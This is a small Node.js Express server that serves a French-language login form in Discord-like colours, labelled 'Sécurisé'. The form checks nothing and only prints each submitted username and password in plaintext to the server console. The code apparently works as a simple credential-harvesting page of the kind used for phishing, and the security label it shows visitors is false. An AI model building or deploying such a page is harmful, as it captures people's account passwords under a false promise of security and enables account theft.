const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// FORM
app.get("/", (req, res) => {
res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Formulaire</title>

<style>
body{
margin:0;
font-family: Arial, sans-serif;
background: linear-gradient(135deg, #5865F2, #4f46e5);
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.container{
background:white;
padding:30px;
border-radius:15px;
width:350px;
box-shadow:0 10px 25px rgba(0,0,0,0.2);
text-align:center;
}

h2{
margin-bottom:20px;
color:#333;
}

input{
width:100%;
padding:12px;
margin-top:10px;
border:1px solid #ddd;
border-radius:8px;
outline:none;
transition:0.2s;
}

input:focus{
border-color:#5865F2;
box-shadow:0 0 5px rgba(88,101,242,0.4);
}

button{
width:100%;
padding:12px;
margin-top:15px;
background:#5865F2;
color:white;
border:none;
border-radius:8px;
cursor:pointer;
font-weight:bold;
transition:0.2s;
}

button:hover{
background:#4752c4;
transform:scale(1.02);
}

.footer{
margin-top:15px;
font-size:12px;
color:gray;
}
</style>

</head>

<body>

<div class="container">

<h2>🔐 Connexion</h2>

<form method="POST" action="/send">

<input name="username" placeholder="Nom d'utilisateur" required />

<input type="password" name="password" placeholder="Mot de passe" required />

<button type="submit">Se connecter</button>

</form>

<div class="footer">
Sécurisé • Node.js Express
</div>

</div>

</body>
</html>
`);
});

// RECEIVE
app.post("/send", (req, res) => {

console.log("BODY:", req.body);
console.log("USERNAME:", req.body.username);
console.log("PASSWORD:", req.body.password);

res.send("OK reçu");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
console.log("Server running on port " + PORT);
});